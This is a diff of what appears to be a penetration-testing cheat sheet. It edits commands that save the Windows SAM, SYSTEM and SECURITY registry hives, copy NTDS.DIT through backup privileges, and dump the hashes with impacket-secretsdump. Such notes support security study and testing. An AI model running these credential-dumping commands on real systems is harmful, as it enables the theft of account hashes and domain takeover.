@@ -491,13 +491,18 @@ reg save hklm\sam 'C:\Windows\Temp\sam'
 reg save hklm\system 'C:\Windows\Temp\system'
 reg save hklm\security 'C:\Windows\Temp\security'
 
-# Transfer the **sam, system,** and **security** files from Windows to Kali and dump locally
-# Copy
-Copy-FileSeBackupPrivilege V:\Windows\NTDS\NTDS.DIT C:\Users\svc_veracrypt\Desktop\NTDS.DIT
+# Transfer the SAM, SYSTEM and SECURITY files from Windows to Kali and to dump them locally
+
+# Example of copying NTDS.DIT with Copy-FileSeBackupPrivilege
+Copy-FileSeBackupPrivilege V:\Windows\NTDS\NTDS.DIT C:\Users\john\Desktop\NTDS.DIT
+# Find a way to get NTDS.DIT and transfer it to Kali for local dump
 
 # impacket-secretsdump
+# With Security
 impacket-secretsdump -system SYSTEM -sam SAM -security SECURITY local
+# With NTDS.DIT
 impacket-secretsdump -system SYSTEM -sam SAM -ntds NTDS.DIT local
+# Without SECURITY and without NTDS.DIT (Still able to dump something interesting)
 impacket-secretsdump -sam SAM -system SYSTEM local
 
 # samdump2
